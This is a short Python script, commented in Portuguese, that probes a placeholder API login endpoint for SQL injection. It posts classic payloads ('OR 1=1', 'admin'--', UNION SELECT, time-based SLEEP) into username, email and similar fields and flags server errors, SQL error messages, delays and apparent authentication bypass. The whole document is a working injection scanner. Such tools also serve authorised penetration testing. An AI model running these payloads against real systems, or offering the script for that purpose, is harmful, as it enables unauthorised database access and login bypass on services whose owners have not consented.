import requests
import time
import re

#URL da API para teste (sem espaços extras)
url = "https://api.exemplo.com/v1/user"

#Headers básicos (alguns ambientes exigem Content-Type)
headers = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0"
}

#Lista de payloads para teste (aumenta cobertura mantendo simplicidade)
payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "admin'--",
    "' UNION SELECT NULL--",
    "' AND SLEEP(3)--"  # Para detectar time-based
]

#Parâmetros que serão testados
params_to_test = ["username", "user", "login", "email"]

print(f"[*] Iniciando teste em: {url}\n")

for param in params_to_test:
    for payload in payloads:
        
        #Monta o payload dinamicamente
        data = {param: payload, "password": "test"}
        
        try:
            #Timeout evita travar em testes time-based
            start = time.time()
            response = requests.post(
                url, 
                json=data, 
                headers=headers, 
                timeout=10,
                allow_redirects=False
            )
            elapsed = time.time() - start
            
            #Indicadores simples de possível vulnerabilidade
            indicators = []
            
            # 1. Erro 500 pode indicar query quebrada
            if response.status_code == 500:
                indicators.append("HTTP_500")
            
            # 2. Keywords de erro SQL no corpo da resposta
            sql_errors = ['sql syntax', 'mysql_fetch', 'unclosed quotation', 'ora-', 'sqlite3']
            if any(err in response.text.lower() for err in sql_errors):
                indicators.append("SQL_ERROR_MSG")
            
            # 3. Time-based: payload com SLEEP e resposta demorada
            if 'sleep' in payload.lower() and elapsed >= 2.5:
                indicators.append("TIME_DELAY")
            
            # 4. Sucesso inesperado (pode ser bypass de auth)
            if response.status_code == 200 and len(response.text) > 500:
                indicators.append("UNEXPECTED_SUCCESS")
            
            #Output do resultado
            if indicators:
                print(f"[+] POSSÍVEL VULNERABILIDADE!")
                print(f"    Param: {param} | Payload: {payload}")
                print(f"    Status: {response.status_code} | Tempo: {elapsed:.2f}s")
                print(f"    Indicadores: {', '.join(indicators)}\n")
            else:
                print(f"[-] Sem anomalias | {param}: {payload[:30]}...")
                
        except requests.exceptions.Timeout:
            print(f"[!] Timeout com payload: {payload}")
        except requests.exceptions.ConnectionError:
            print(f"[!] Erro de conexão - verifique a URL: {url}")
            break
        except Exception as e:
            print(f"[!] Erro inesperado: {e}")
        
        #Pequeno delay para não sobrecarregar a aplicação
        time.sleep(0.5)

print("\n[*] Teste concluído.")
